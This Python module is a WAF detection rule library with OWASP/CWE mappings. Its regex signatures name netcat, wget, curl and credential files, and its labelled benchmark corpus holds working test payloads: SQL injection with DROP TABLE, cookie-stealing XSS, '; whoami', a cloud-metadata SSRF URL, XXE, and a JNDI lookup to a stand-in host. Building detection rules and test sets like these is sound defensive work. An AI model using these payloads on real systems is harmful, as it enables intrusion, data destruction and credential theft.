"""
SentinelShield detection rule library.

Every rule is a structured signature with:
    id           unique rule identifier (used in logs, alerts and reports)
    name         short human-readable name
    category     attack family shown on the dashboard
    severity     Low | Medium | High | Critical
    score        anomaly points added when the rule matches
    pattern      regular expression (compiled case-insensitively)
    stage        "normalized" (after decoding), "raw" (before decoding) or "both"
    targets      request locations the rule applies to ("any", "path", "user-agent", ...)
    description  why the pattern is dangerous
    owasp / cwe  industry mappings used in reports

A request is BLOCKED when its total anomaly score reaches the block
threshold (default 5) and FLAGGED when it reaches the flag threshold
(default 3). This mirrors the anomaly-scoring model used by production
WAF rule sets such as the OWASP Core Rule Set.
"""

import re

SEVERITY_ORDER = {"Info": 0, "Low": 1, "Medium": 2, "High": 3, "Critical": 4}

# Commands that are dangerous in almost any context after a shell metacharacter.
_STRONG_CMDS = (
    r"whoami|uname|wget|curl|nc|ncat|netcat|bash|zsh|powershell|pwsh|"
    r"ifconfig|ipconfig|nslookup|hostname|passwd|chmod|chown|rm\s+-|"
    r"net\s+user|systeminfo|tasklist|/bin/(?:ba)?sh"
)
# Common words that are only suspicious when used like a command
# (followed by an option/path argument, or nothing at all).
_WEAK_CMDS = r"id|ls|cat|pwd|ping|echo|type|dir|sh|ps|env|head|tail|more|less|sleep"

DETECTION_RULES = [
    # ------------------------------------------------------------------
    # SQL Injection  (OWASP A03:2021 - Injection, CWE-89)
    # ------------------------------------------------------------------
    {
        "id": "SS-SQLI-001",
        "name": "UNION-based query injection",
        "category": "SQL Injection",
        "severity": "High",
        "score": 6,
        "pattern": r"\bunion\b(?:\s+(?:all|distinct))?\s+select\b",
        "description": "UNION SELECT appends attacker-controlled rows to a query result.",
    },
    {
        "id": "SS-SQLI-002",
        "name": "Boolean tautology",
        "category": "SQL Injection",
        "severity": "High",
        "score": 6,
        "pattern": (
            r"(?:['\"`)]\s*(?:or|and|\|\||&&)\s*['\"`(]?\s*[\w'\"]+\s*['\"`)]?\s*(?:=|<>|!=|\blike\b)\s*['\"`(]?\s*[\w'\"]+)"
            r"|(?:\b(?:or|and)\s+(\d+)\s*=\s*\1\b)"
            r"|(?:['\"`]\s*(?:or|and)\s+(?:true|false)\b)"
        ),
        "description": "Always-true conditions such as OR 1=1 bypass WHERE clauses and logins.",
    },
    {
        "id": "SS-SQLI-003",
        "name": "Quote followed by SQL comment",
        "category": "SQL Injection",
        "severity": "High",
        "score": 5,
        "pattern": r"['\"`]\s*\)?\s*(?:--|#|/\*|;\s*--)",
        "description": "Closing a string literal and commenting out the rest of the query (e.g. admin'--).",
    },
    {
        "id": "SS-SQLI-004",
        "name": "Stacked query",
        "category": "SQL Injection",
        "severity": "High",
        "score": 6,
        "pattern": r";\s*(?:drop|delete|insert|update|select|shutdown|exec(?:ute)?|declare|truncate|alter|create)\b",
        "description": "A second SQL statement chained after the original query.",
    },
    {
        "id": "SS-SQLI-005",
        "name": "Time-based blind injection",
        "category": "SQL Injection",
        "severity": "High",
        "score": 6,
        "pattern": r"\b(?:sleep|benchmark|pg_sleep)\s*\(\s*\d|\bwaitfor\s+delay\b|\bdbms_lock\.sleep\b",
        "description": "Delays the database response to extract data one bit at a time.",
    },
    {
        "id": "SS-SQLI-006",
        "name": "Database schema enumeration",
        "category": "SQL Injection",
        "severity": "High",
        "score": 6,
        "pattern": r"\binformation_schema\b|\bsysobjects\b|\bpg_catalog\b|\bsqlite_master\b|\bmysql\.user\b",
        "description": "Reads database metadata to discover tables and columns.",
    },
    {
        "id": "SS-SQLI-007",
        "name": "SQL query structure",
        "category": "SQL Injection",
        "severity": "High",
        "score": 6,
        "pattern": (
            r"\bselect\s+(?:\*|count\s*\(|@@\w+|version\s*\(|user\s*\(|database\s*\(|concat\s*\(|load_file\s*\()"
            r"|\bselect\b[^;]{1,80}?\bfrom\b\s+[\w.`\[\]\"]+\s*(?:\bwhere\b[^;]*?(?:=|\blike\b)|\blimit\s+\d|;|--|#)"
        ),
        "description": "A SQL SELECT statement embedded in user input (plain English is not matched).",
    },
    {
        "id": "SS-SQLI-008",
        "name": "Destructive SQL statement",
        "category": "SQL Injection",
        "severity": "Critical",
        "score": 8,
        "pattern": (
            r"\bdrop\s+(?:table|database|schema)\b|\btruncate\s+table\b"
            r"|\binsert\s+into\s+[\w.`\[\]\"]+\s*(?:\(|values\b)"
            r"|\bdelete\s+from\s+[\w.`\[\]\"]+\s*(?:\bwhere\b|;|--|$)"
            r"|\bupdate\s+[\w.`\[\]\"]+\s+set\s+\w+\s*="
        ),
        "description": "Statements that modify or destroy stored data.",
    },
    # ------------------------------------------------------------------
    # Cross-Site Scripting  (OWASP A03:2021 - Injection, CWE-79)
    # ------------------------------------------------------------------
    {
        "id": "SS-XSS-001",
        "name": "Script tag",
        "category": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "score": 6,
        "pattern": r"<\s*/?\s*script\b",
        "description": "Injects executable JavaScript into the page.",
    },
    {
        "id": "SS-XSS-002",
        "name": "HTML tag with event handler",
        "category": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "score": 6,
        "pattern": r"<[a-z][^>]*?[\s/\"'](?:on[a-z]{3,})\s*=",
        "description": "Event handlers such as onerror/onload execute JavaScript without a script tag.",
    },
    {
        "id": "SS-XSS-003",
        "name": "Dangerous embedding tag",
        "category": "Cross-Site Scripting (XSS)",
        "severity": "Medium",
        "score": 5,
        "pattern": r"<\s*(?:iframe|frame|frameset|object|embed|svg|math|base|meta|link|applet|form)\b",
        "description": "Tags that can load or execute external content.",
    },
    {
        "id": "SS-XSS-004",
        "name": "Script URI scheme",
        "category": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "score": 6,
        "pattern": r"\b(?:javascript|vbscript|livescript)\s*:\s*[\w$.]+\s*[(\[=`]|\bdata\s*:\s*text/html",
        "description": "javascript: / data:text/html URIs execute code when the link is opened.",
    },
    {
        "id": "SS-XSS-005",
        "name": "Attribute event-handler injection",
        "category": "Cross-Site Scripting (XSS)",
        "severity": "Medium",
        "score": 3,
        "pattern": r"[\"']\s*\bon(?:error|load|mouseover|focus|click|blur|toggle|animationstart|pointerover)\s*=",
        "description": "Breaking out of an attribute value to add an event handler.",
    },
    {
        "id": "SS-XSS-006",
        "name": "DOM sink access",
        "category": "Cross-Site Scripting (XSS)",
        "severity": "Medium",
        "score": 3,
        "pattern": r"\bdocument\s*\.\s*(?:cookie|domain|write)\b|\.innerHTML\s*=|\bwindow\s*\.\s*location\s*=|\balert\s*\(|\bprompt\s*\(|\bconfirm\s*\(",
        "description": "Reads cookies or rewrites the page - typical XSS payload behaviour.",
    },
    # ------------------------------------------------------------------
    # Directory Traversal  (OWASP A01:2021 - Broken Access Control, CWE-22)
    # ------------------------------------------------------------------
    {
        "id": "SS-TRAV-001",
        "name": "Path traversal sequence",
        "category": "Directory Traversal",
        "severity": "Medium",
        "score": 5,
        "pattern": r"(?:^|[\\/=\s\"'])\.\.[\\/]",
        "description": "../ sequences climb out of the intended directory.",
    },
    {
        "id": "SS-TRAV-002",
        "name": "Encoded traversal (evasion)",
        "category": "Directory Traversal",
        "severity": "High",
        "score": 3,
        "stage": "raw",
        "pattern": r"%2e%2e(?:%2f|%5c|/|\\)|\.\.(?:%2f|%5c)|%252e|%c0%ae|%c0%af|%e0%80%ae|\.\.%u2215",
        "description": "URL-encoded or double-encoded traversal used to evade simple filters.",
    },
    # ------------------------------------------------------------------
    # Local File Inclusion  (OWASP A01:2021, CWE-98)
    # ------------------------------------------------------------------
    {
        "id": "SS-LFI-001",
        "name": "Sensitive Unix file",
        "category": "Local File Inclusion (LFI)",
        "severity": "High",
        "score": 6,
        "pattern": r"/etc/(?:passwd|shadow|group|hosts|issue|sudoers|crontab)\b|/proc/self/|/var/log/[\w./-]+|\.ssh/(?:id_rsa|authorized_keys)",
        "description": "References operating-system files that disclose users, secrets or logs.",
    },
    {
        "id": "SS-LFI-002",
        "name": "Sensitive Windows file",
        "category": "Local File Inclusion (LFI)",
        "severity": "High",
        "score": 6,
        "pattern": r"\bboot\.ini\b|\bwin\.ini\b|\bsystem32[\\/]|[\\/]windows[\\/](?:system|win)|\bsam\b\s*$",
        "description": "References Windows system files.",
    },
    {
        "id": "SS-LFI-003",
        "name": "Stream wrapper inclusion",
        "category": "Local File Inclusion (LFI)",
        "severity": "High",
        "score": 6,
        "pattern": r"\b(?:php|zip|phar|expect|glob|compress\.zlib)://|\bfile://",
        "description": "Language stream wrappers that read local files or source code.",
    },
    {
        "id": "SS-LFI-004",
        "name": "Null-byte injection",
        "category": "Local File Inclusion (LFI)",
        "severity": "High",
        "score": 5,
        "stage": "raw",
        "pattern": r"%00|\\x00|\x00",
        "description": "A null byte truncates file names to bypass extension checks.",
    },
    # ------------------------------------------------------------------
    # Command Injection  (OWASP A03:2021, CWE-78)
    # ------------------------------------------------------------------
    {
        "id": "SS-CMDI-001",
        "name": "Chained system command",
        "category": "Command Injection",
        "severity": "Critical",
        "score": 8,
        "pattern": r"(?:;|\|\|?|&&|\n|^\s*&)\s*(?:" + _STRONG_CMDS + r")\b",
        "description": "Shell metacharacters followed by an operating-system command.",
    },
    {
        "id": "SS-CMDI-002",
        "name": "Chained command with arguments",
        "category": "Command Injection",
        "severity": "Critical",
        "score": 8,
        "pattern": r"(?:;|\|\|?|&&|\n)\s*(?:" + _WEAK_CMDS + r")(?:\s+[^\s;|&]*[/\-][^\s;|&]*|\s*$|\s*[;|&])",
        "description": "A common command (ls, cat, id, ping...) used with options or paths after a metacharacter.",
    },
    {
        "id": "SS-CMDI-003",
        "name": "Command substitution",
        "category": "Command Injection",
        "severity": "Critical",
        "score": 8,
        "pattern": r"\$\(\s*(?:" + _STRONG_CMDS + r"|" + _WEAK_CMDS + r")\b[^)]*\)|`\s*(?:" + _STRONG_CMDS + r"|" + _WEAK_CMDS + r")\b[^`]*`",
        "description": "$(...) or backticks make the shell run a command inside another command.",
    },
    # ------------------------------------------------------------------
    # Server-Side Request Forgery  (OWASP A10:2021, CWE-918)
    # ------------------------------------------------------------------
    {
        "id": "SS-SSRF-001",
        "name": "Cloud metadata endpoint",
        "category": "Server-Side Request Forgery (SSRF)",
        "severity": "Critical",
        "score": 8,
        "pattern": r"\b169\.254\.169\.254\b|\bmetadata\.google\.internal\b|\b100\.100\.100\.200\b|\bfd00:ec2::254\b",
        "description": "Cloud instance metadata services expose credentials to SSRF.",
    },
    {
        "id": "SS-SSRF-002",
        "name": "Internal address in URL parameter",
        "category": "Server-Side Request Forgery (SSRF)",
        "severity": "High",
        "score": 6,
        "pattern": (
            r"\b(?:https?|ftp|gopher|dict|ldap|tftp)://"
            r"(?:localhost|127\.\d{1,3}\.\d{1,3}\.\d{1,3}|0\.0\.0\.0|0x7f|2130706433|\[::1?\]"
            r"|10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3})"
        ),
        "description": "Forces the server to request internal-only services.",
    },
    {
        "id": "SS-SSRF-003",
        "name": "Uncommon URL scheme",
        "category": "Server-Side Request Forgery (SSRF)",
        "severity": "High",
        "score": 5,
        "pattern": r"\b(?:gopher|dict|tftp|ldap|jar|netdoc)://",
        "description": "Schemes that let SSRF talk raw protocols to internal services.",
    },
    # ------------------------------------------------------------------
    # Server-Side Template Injection  (CWE-1336)
    # ------------------------------------------------------------------
    {
        "id": "SS-SSTI-001",
        "name": "Template expression probe",
        "category": "Server-Side Template Injection (SSTI)",
        "severity": "High",
        "score": 6,
        "pattern": (
            r"\{\{\s*\d+\s*[*+\-/]\s*\d+\s*\}\}|\$\{\s*\d+\s*[*+\-/]\s*\d+\s*\}|<%=?\s*\d+\s*[*+]\s*\d+\s*%>|#\{\s*\d+\s*[*+]\s*\d+\s*\}"
            r"|\{\{[^}]*(?:__class__|__mro__|__subclasses__|__globals__|__builtins__|config\.items|self\._|request\.application|lipsum|cycler)"
        ),
        "description": "Template expressions evaluated on the server can lead to code execution.",
    },
    # ------------------------------------------------------------------
    # Log4Shell / JNDI injection  (CVE-2021-44228, CWE-917)
    # ------------------------------------------------------------------
    {
        "id": "SS-JNDI-001",
        "name": "JNDI lookup (Log4Shell)",
        "category": "Log4Shell (JNDI Injection)",
        "severity": "Critical",
        "score": 10,
        "pattern": r"\$\{\s*jndi\s*:|\$\{[^}]{0,40}\$\{(?:lower|upper|::-|env|sys|date)[^}]*\}[^}]*\}",
        "description": "JNDI lookups in logged strings trigger remote code loading in vulnerable Log4j.",
    },
    # ------------------------------------------------------------------
    # XML External Entity  (OWASP A05:2021, CWE-611)
    # ------------------------------------------------------------------
    {
        "id": "SS-XXE-001",
        "name": "External entity declaration",
        "category": "XML External Entity (XXE)",
        "severity": "Critical",
        "score": 8,
        "pattern": r"<!ENTITY\s+%?\s*\w+\s+(?:SYSTEM|PUBLIC)\b|<!DOCTYPE[^>]*\[\s*<!ENTITY",
        "description": "External entities make XML parsers read local files or call internal URLs.",
    },
    # ------------------------------------------------------------------
    # NoSQL Injection  (CWE-943)
    # ------------------------------------------------------------------
    {
        "id": "SS-NOSQL-001",
        "name": "NoSQL query operator",
        "category": "NoSQL Injection",
        "severity": "High",
        "score": 6,
        "pattern": r"\[\s*\$(?:ne|gt|gte|lt|lte|regex|where|nin|in|exists|expr|or)\s*\]|[\"']\$(?:ne|gt|gte|lt|lte|regex|where|nin|expr|or)[\"']\s*:",
        "description": "MongoDB-style operators that change query logic (e.g. password[$ne]=x).",
    },
    # ------------------------------------------------------------------
    # CRLF / HTTP header injection  (CWE-93)
    # ------------------------------------------------------------------
    {
        "id": "SS-CRLF-001",
        "name": "CRLF header injection",
        "category": "CRLF Injection",
        "severity": "Medium",
        "score": 5,
        "stage": "raw",
        "pattern": r"(?:%0d|%0a|\r|\n)+\s*(?:set-cookie|location|content-type|content-length|x-[\w-]+)\s*:",
        "description": "Injected line breaks add attacker-controlled HTTP headers to the response.",
    },
    # ------------------------------------------------------------------
    # Reconnaissance
    # ------------------------------------------------------------------
    {
        "id": "SS-SCAN-001",
        "name": "Security scanner user-agent",
        "category": "Automated Scanner",
        "severity": "Medium",
        "score": 5,
        "targets": ["user-agent"],
        "pattern": r"\b(?:sqlmap|nikto|nmap|masscan|acunetix|nessus|openvas|wpscan|dirbuster|gobuster|feroxbuster|ffuf|wfuzz|zgrab|nuclei|havij|w3af|arachni|skipfish|whatweb)\b",
        "description": "User-Agent of a known automated vulnerability scanner.",
    },
    {
        "id": "SS-RECON-001",
        "name": "Sensitive file probe",
        "category": "Sensitive File Probe",
        "severity": "Medium",
        "score": 5,
        "targets": ["path"],
        "pattern": r"/\.(?:env|git|svn|hg|htaccess|htpasswd|DS_Store|aws|docker)\b|/wp-config\.php|/(?:phpmyadmin|pma|adminer)\b|/server-status\b|/(?:backup|db|dump|database)\.(?:sql|zip|tar|gz|bak)\b|\.(?:bak|old|swp)$",
        "description": "Requests for configuration, backup or source-control files.",
    },
]

OWASP_MAP = {
    "SQL Injection": ("A03:2021 Injection", "CWE-89"),
    "Cross-Site Scripting (XSS)": ("A03:2021 Injection", "CWE-79"),
    "Directory Traversal": ("A01:2021 Broken Access Control", "CWE-22"),
    "Local File Inclusion (LFI)": ("A01:2021 Broken Access Control", "CWE-98"),
    "Command Injection": ("A03:2021 Injection", "CWE-78"),
    "Server-Side Request Forgery (SSRF)": ("A10:2021 SSRF", "CWE-918"),
    "Server-Side Template Injection (SSTI)": ("A03:2021 Injection", "CWE-1336"),
    "Log4Shell (JNDI Injection)": ("A06:2021 Vulnerable Components", "CWE-917"),
    "XML External Entity (XXE)": ("A05:2021 Security Misconfiguration", "CWE-611"),
    "NoSQL Injection": ("A03:2021 Injection", "CWE-943"),
    "CRLF Injection": ("A03:2021 Injection", "CWE-93"),
    "Automated Scanner": ("A05:2021 Security Misconfiguration", "CWE-200"),
    "Sensitive File Probe": ("A05:2021 Security Misconfiguration", "CWE-538"),
    "Abusive Traffic": ("A04:2021 Insecure Design", "CWE-770"),
    "Brute Force": ("A07:2021 Identification & Auth Failures", "CWE-307"),
    "Scanning Behaviour": ("A05:2021 Security Misconfiguration", "CWE-200"),
}

# Fill in defaults, mappings and compiled patterns.
for _rule in DETECTION_RULES:
    _rule.setdefault("stage", "both")
    _rule.setdefault("targets", ["any"])
    _rule.setdefault("enabled", True)
    _owasp, _cwe = OWASP_MAP.get(_rule["category"], ("-", "-"))
    _rule.setdefault("owasp", _owasp)
    _rule.setdefault("cwe", _cwe)
    _rule["regex"] = re.compile(_rule["pattern"], re.IGNORECASE)

RULES_BY_ID = {rule["id"]: rule for rule in DETECTION_RULES}
CATEGORIES = list(dict.fromkeys(rule["category"] for rule in DETECTION_RULES))


# ----------------------------------------------------------------------
# Labelled benchmark corpus used to measure detection accuracy,
# false positives and false negatives. Entries are (input, expected
# category or "Normal"). Benign samples deliberately include text that
# resembles attack syntax to prove the rules do not over-block.
# ----------------------------------------------------------------------
BENCHMARK_CORPUS = [
    # --- SQL Injection ---
    ("' OR 1=1 --", "SQL Injection"),
    ("' OR '1'='1", "SQL Injection"),
    ("admin'--", "SQL Injection"),
    ("1 UNION SELECT username, password FROM users", "SQL Injection"),
    ("1%20UNION%20SELECT%20null,null--", "SQL Injection"),
    ("1 UNION/**/SELECT 1,2,3", "SQL Injection"),
    ("1; DROP TABLE users", "SQL Injection"),
    ("1 AND SLEEP(5)", "SQL Injection"),
    ("1' AND 1=1 #", "SQL Injection"),
    ("id=1 or 1=1", "SQL Injection"),
    ("x' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --", "SQL Injection"),
    ("'; WAITFOR DELAY '0:0:5'--", "SQL Injection"),
    ("%27%20OR%20%271%27%3D%271", "SQL Injection"),
    # --- XSS ---
    ("<script>alert(1)</script>", "Cross-Site Scripting (XSS)"),
    ("<img src=x onerror=alert(1)>", "Cross-Site Scripting (XSS)"),
    ("<svg/onload=alert(1)>", "Cross-Site Scripting (XSS)"),
    ("<iframe src=\"https://example.invalid\"></iframe>", "Cross-Site Scripting (XSS)"),
    ("<a href=\"javascript:alert(1)\">click</a>", "Cross-Site Scripting (XSS)"),
    ("<body onload=alert('x')>", "Cross-Site Scripting (XSS)"),
    ("%3Cscript%3Ealert(1)%3C%2Fscript%3E", "Cross-Site Scripting (XSS)"),
    ("&lt;script&gt;alert(1)&lt;/script&gt;", "Cross-Site Scripting (XSS)"),
    ("<div onmouseover=\"alert(1)\">hover</div>", "Cross-Site Scripting (XSS)"),
    ("\"><script>alert(document.cookie)</script>", "Cross-Site Scripting (XSS)"),
    # --- Directory Traversal ---
    ("../../../../windows/temp", "Directory Traversal"),
    ("..\\..\\..\\config", "Directory Traversal"),
    ("file=..%2f..%2f..%2fapp.conf", "Directory Traversal"),
    ("%2e%2e%2f%2e%2e%2fsecret.txt", "Directory Traversal"),
    ("%252e%252e%252fconfig", "Directory Traversal"),
    # --- LFI ---
    ("/etc/passwd", "Local File Inclusion (LFI)"),
    ("page=/etc/shadow", "Local File Inclusion (LFI)"),
    ("php://filter/convert.base64-encode/resource=index.php", "Local File Inclusion (LFI)"),
    ("C:\\Windows\\win.ini", "Local File Inclusion (LFI)"),
    ("file:///etc/hosts", "Local File Inclusion (LFI)"),
    ("/proc/self/environ", "Local File Inclusion (LFI)"),
    # --- Command Injection ---
    ("; whoami", "Command Injection"),
    ("127.0.0.1 && id", "Command Injection"),
    ("| cat /etc/hosts", "Command Injection"),
    ("; ls -la", "Command Injection"),
    ("$(whoami)", "Command Injection"),
    ("`id`", "Command Injection"),
    ("127.0.0.1 || uname -a", "Command Injection"),
    ("host=8.8.8.8; ping -c 1 127.0.0.1", "Command Injection"),
    # --- SSRF ---
    ("url=http://169.254.169.254/latest/meta-data/", "Server-Side Request Forgery (SSRF)"),
    ("next=http://127.0.0.1:8080/admin", "Server-Side Request Forgery (SSRF)"),
    ("feed=gopher://internal.example.invalid:70/", "Server-Side Request Forgery (SSRF)"),
    # --- SSTI ---
    ("name={{7*7}}", "Server-Side Template Injection (SSTI)"),
    ("${7*7}", "Server-Side Template Injection (SSTI)"),
    # --- Log4Shell ---
    ("${jndi:ldap://example.invalid/a}", "Log4Shell (JNDI Injection)"),
    # --- XXE ---
    ("<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]>", "XML External Entity (XXE)"),
    # --- NoSQL ---
    ("username=admin&password[$ne]=x", "NoSQL Injection"),
    ("{\"username\": \"admin\", \"password\": {\"$gt\": \"\"}}", "NoSQL Injection"),
    # --- CRLF ---
    ("lang=en%0d%0aSet-Cookie:%20session=attacker", "CRLF Injection"),
    # --- Benign (must be ALLOWED) ---
    ("search=hello", "Normal"),
    ("name=O'Brien&city=Pune", "Normal"),
    ("I want to select a dress from the shop", "Normal"),
    ("Please delete from my cart the blue shoes", "Normal"),
    ("Tom & Jerry is my favourite cartoon", "Normal"),
    ("email=student@example.com&course=cybersecurity", "Normal"),
    ("1 + 1 = 2 and 2 + 2 = 4", "Normal"),
    ("I love my cat | she loves fish", "Normal"),
    ("Learning JavaScript: the good parts", "Normal"),
    ("Can you update my profile settings?", "Normal"),
    ("Price: $50 (discount) -- limited offer", "Normal"),
    ("It's a great day, isn't it?", "Normal"),
    ("q=union+station+parking", "Normal"),
    ("Order #1234 - please ship to 221B Baker Street", "Normal"),
    ("The script of the movie was amazing", "Normal"),
    ("Meet me at 10:30; bring the id card", "Normal"),
    ("page=2&sort=price&order=asc", "Normal"),
    ("comment=Great product! 5/5 would buy again.", "Normal"),
    ("Use the ../ notation to describe parent folders in docs", "Directory Traversal"),
    ("phone=+91-9876543210&pincode=411001", "Normal"),
    ("What does OR mean in logic? True or false", "Normal"),
    ("Hello {{ name }}, welcome back!", "Normal"),
    ("user agent string for Firefox on Windows", "Normal"),
    ("The password policy says use 12 characters", "Normal"),
    ("I selected three items from the menu", "Normal"),
    ("redirect=/dashboard&tab=overview", "Normal"),
    ("ping me when you are online", "Normal"),
    ("cat and dog photos", "Normal"),
    ("Version 2.0 release notes: performance improvements", "Normal"),
    ("data science and machine learning roadmap", "Normal"),
]
